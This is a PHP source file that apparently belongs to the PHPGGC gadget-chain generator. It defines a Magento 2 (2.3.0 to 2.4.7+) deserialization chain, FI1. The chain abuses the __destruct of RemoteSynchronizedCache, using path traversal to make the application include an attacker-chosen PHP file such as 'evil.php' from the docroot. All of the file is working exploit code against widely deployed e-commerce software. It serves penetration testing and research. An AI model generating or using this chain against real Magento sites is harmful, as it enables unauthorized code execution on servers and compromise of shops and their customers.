<?php

namespace GadgetChain\Magento2;

class FI1 extends \PHPGGC\GadgetChain\FileInclude
{
    public static $version = '2.3.0 <= 2.4.7+';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'Your included file must end in .php
    The include uses path traversal to try to get back to the docroot (typically
    the "pub" directory). So the target path can be relative to that, or can use
    more path traversal to resolve elsewhere. For example a target of "evil.php"
    might result in include being called on:
    /path/to/magento2/generated/metadata/rsl::/../../../pub/evil.php';

    public function process_parameters(array $parameters)
    {
        $parameters = parent::process_parameters($parameters);
        // Remove the .php suffix if it has been specified, as it will be added
        // by the application.
        $parameters['remote_path'] = preg_replace('#.php$#', '', $parameters['remote_path']);
        $parameters['remote_path'] = '/../../../pub/' . ltrim($parameters['remote_path'], '/');
        return $parameters;
    }

    public function generate(array $parameters)
    {
        return new \Magento\Framework\Cache\Backend\RemoteSynchronizedCache(
            new \Magento\Framework\App\ObjectManager\ConfigLoader\Compiled(),
            $parameters['remote_path']
        );
    }
}
